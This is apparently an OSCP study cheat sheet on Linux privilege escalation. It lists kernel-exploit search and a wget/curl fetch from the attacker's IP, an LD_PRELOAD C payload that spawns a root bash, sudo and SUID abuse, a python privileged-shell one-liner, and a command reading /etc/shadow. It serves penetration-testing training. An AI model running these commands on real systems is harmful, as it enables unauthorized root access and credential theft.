# Linux Privilege Escalation – OSCP Markdown

## Kernel Exploits 
*Kernel exploits can crash the target. Use them only as last resort!*

### Step 1 - Find the Linux Kernel Version
```
cat /etc/issue
```
```
uname -a
```

### Step 2 - Search and find an exploit code for the kernel version
- [Exploit DB](https://www.exploit-db.com/)
- [Google](https://google.com)
- [CVE Details](https://www.cvedetails.com/)
- `searchsploit`

You can use `searchsploit` to easily find the `.c` or `.txt` file for faster exploitation.
```
searchsploit Ubuntu 14.40
searchsploit "3.13" "ubuntu"
searchsploit overlay
searchsploit local linux
```
```
cp /usr/share/exploitdb/exploits/linux/local/37292.c .
scp 37292.c user@<TARGET_IP>:/tmp 
```

### Step 3 - Exploiting!!!
**Upload the CVE via a HTPP Server**
```
python3 -m http.server 8000
```

**Then GET the File**
```
wget http://<YOUR_IP>:8000/file_name
```
OR 
```
curl -O http://<DEINE_IP>:8000/datei_name
```
OR when SSH avaiable
```
scp datei user@<TARGET_IP>:/tmp/
```

**dont forget to make it executeable**
```
chmod +x file
```

**RUN IT AND HOPE THAT YOUR MACHINE DONT CRASH**

## Sudo

### Step 1 - Check your current situation
```
sudo -l
```

### Step 2 - GET ROOT

### Step 2a - LD_PRELOAD Option?
![preload option](./img/image-2.png)

When you see this option you practically have free `sudo`

**Write a simple C code compiled as a shared object(.so extensio)**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

**AND NOW YOU CAN GET SUUUUUDOOOO**
```
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

### Step 2b - runable files with sudo rights
```
sudo -l
```
![sudo -l](./img/image-3.png)
In this case we have 3 files executeable with sudo without a passwort:
- (ALL) NOPASSWD: `/usr/bin/find`
- (ALL) NOPASSWD: `/usr/bin/less`
- (ALL) NOPASSWD: `/usr/bin/nano`


Just check out here what to do further and in a few seconds you have root:
- [GTFOBins](https://gtfobins.github.io/)

**PRIV-ESC and ROOT**


## SUID
SUID - OWNER
SGID - GROUP

### Step 1 - Find all SUID files
```
find / -perm -4000 -type f 2>/dev/null
```

### Step 2 - look online whether there are SUID PrivEsc Exploits
- Check [GTFOBins](https://gtfobins.github.io/) out for that

![suid gtfobins](./img/image-4.png)

### Step 3 - ROOT
Execute the Exploits and get **ROOT** or a **FLAG**

**most fun and most often possibilities**
```
/usr/bin/awk
/usr/bin/perl
/usr/bin/python*
/usr/bin/env
```

FUNNNN PYTHON!!!!
```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

## Get password hashes
```
cat /etc/shadow
```